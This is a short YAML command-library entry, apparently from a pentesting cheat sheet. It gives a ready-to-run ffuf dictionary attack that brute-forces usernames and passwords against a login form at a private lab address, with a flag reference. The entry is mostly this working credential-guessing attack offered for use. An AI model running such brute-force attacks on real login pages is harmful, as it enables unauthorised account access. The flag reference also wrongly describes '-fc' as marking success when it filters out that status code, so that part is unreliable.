---
description: |
  Example dictionary attack with ffuf.

  Command Reference:

    Target_url: The target url to fuzz on
    
    Wordlist: Wordlist to use for directory busting
    
    w: wordlist parameter
    
    u: url parameter
    
    H: Custom header
    
    X: HTTP method
    
    fc: Status code to indicate success
    
    d: Data to send with the post request
    
    W1: Usernames to fuzz
    
    W2: Passwords to fuzz

command: |
  ffuf -w <wordlist_usernames>:W1,<wordlist_passwords>:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.120.213/customers/login -fc 200
  
items:

target: |
  - Linux_target
  - MacOS_target
  - Windows_target
  
OS:
  - Linux
  - MacOS
  
environment: |
  - Web
  
command_types:
  - Brute_Force_Dictionary
  
references:
  - https://github.com/ffuf/ffuf
---
